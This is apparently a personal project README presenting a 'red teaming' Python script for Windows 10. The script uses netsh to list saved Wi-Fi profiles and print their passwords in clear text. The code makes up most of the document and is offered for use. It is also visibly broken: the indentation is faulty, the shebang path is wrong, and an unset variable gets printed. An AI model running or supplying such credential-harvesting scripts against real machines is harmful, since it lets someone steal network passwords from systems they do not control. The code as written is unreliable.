# Programming-Projects

The idea behind this project is to gain fundamental knowledge in programming languages and automation.
I have wrote a red teaming python script that reads all wireless connections and their passwords on windows 10 operating systems.
   

## Below is my code

    #!/bin/usr/env python

    import subprocess


    def get_wifi_profiles():
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
        data = meta_data.decode("utf-8")
        data = data.split("\n")
        names = []
        for line in data:
            if "All User Profile     :" in line:
            name = line.split(":")[1]
            names.append(name[1:-1])
        return names

    for name in get_wifi_profiles():
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name , 'key=clear'])
        data = meta_data.decode("utf-8",errors="backslashreplace")
        data = data.split("\n")
        names = []    
        for line in data :
            if "Key Content" in line :
           #print(line)
               password = line.split(":")[1]

        print(name," : ", password)  
